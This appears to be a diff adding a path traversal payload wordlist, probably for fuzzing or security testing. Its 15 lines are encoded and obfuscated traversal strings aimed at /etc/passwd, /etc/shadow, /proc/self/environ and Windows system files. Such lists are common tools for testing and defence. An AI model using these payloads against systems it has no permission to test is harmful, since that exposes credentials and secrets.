@@ -1,0 +1,15 @@
+../../etc/passwd
+..%2f..%2fetc%2fpasswd
+....//....//etc/passwd
+..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..\/..\/etc\/passwd
+..%5c..%5cetc%5cpasswd
+/etc/passwd
+/windows/win.ini
+c:\windows\system32\drivers\etc\hosts
+..\..\..\..\..\..\windows\win.ini
+..%c0%af..%c0%afetc/passwd
+/var/www/html/../../../../etc/shadow
+/proc/self/environ
+....\/....\/etc\/passwd
